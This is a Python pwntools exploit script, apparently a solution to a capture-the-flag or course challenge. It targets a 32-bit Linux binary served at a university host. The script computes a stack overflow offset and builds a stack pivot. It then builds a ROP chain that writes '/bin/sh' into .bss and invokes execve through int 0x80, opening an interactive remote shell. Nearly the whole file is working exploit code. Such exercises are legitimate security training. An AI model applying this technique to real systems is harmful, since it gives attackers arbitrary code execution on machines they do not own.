from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

# P = gdb.debug('./bin', '''b* main+100
            #   b *authenticate_user + 63
            #   b *authenticate_user + 143
            #   c
            # ''')
P = process('./bin')
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10106)

elf = ELF("./bin")

bssAddr = elf.get_section_by_name('.bss').header.sh_addr

sPass = 0xffffcb40
sRip = 0xffffcbcc
offset = sRip - sPass

print(hex(offset))
print(hex(148 - offset))

# EDX  0xffffcbe0 ◂— 'STT\n' at the return of authenticate_user
#

# 0x08064d88 : push edx ; ret
pushEdx = 0x08064d88

#0x080aaa5c : add esp, 0x14 ; ret
addEsp0x14 = 0x080aaa5c

# 0x0807b790 : add esp, 0x10 ; pop ebx ; ret
addEsp0x10PopEbx = 0x0807b790

payloadPivot = b"A"*offset
payloadPivot += p32(addEsp0x10PopEbx)
# payload += p32(addEsp0x14)
# payload += p32(pushEdx)


#0x080700e0 : pop edx ; pop ecx ; pop ebx ; ret
popEdxPopEcxPopEbx = 0x080700e0


#0x08055abb : mov dword ptr [edx], eax ; ret
movDwordPtrEdxEax = 0x08055abb

#0x080700ba : pop edx ; ret
popEdx = 0x080700ba

#0x0804c6dd : pop eax ; ret
popEax = 0x0804c6dd

# 0x0806dc95 : int 0x80
int80 = 0x0806dc95

binSh1 = b"/bin"
binSh2 = b"/sh\x00"

payloadROP = b"AAAA"
payloadROP += p32(popEdx) + p32(bssAddr) + p32(popEax) + binSh1 + p32(movDwordPtrEdxEax)
payloadROP += p32(popEdx) + p32(bssAddr + 4) + p32(popEax) + binSh2 + p32(movDwordPtrEdxEax)
payloadROP += p32(popEdxPopEcxPopEbx) + p32(0) + p32(0) + p32(bssAddr) + p32(popEax) + p32(0xb)
payloadROP += p32(int80)


P.sendline(payloadROP)
P.sendline(payloadPivot)
P.interactive()
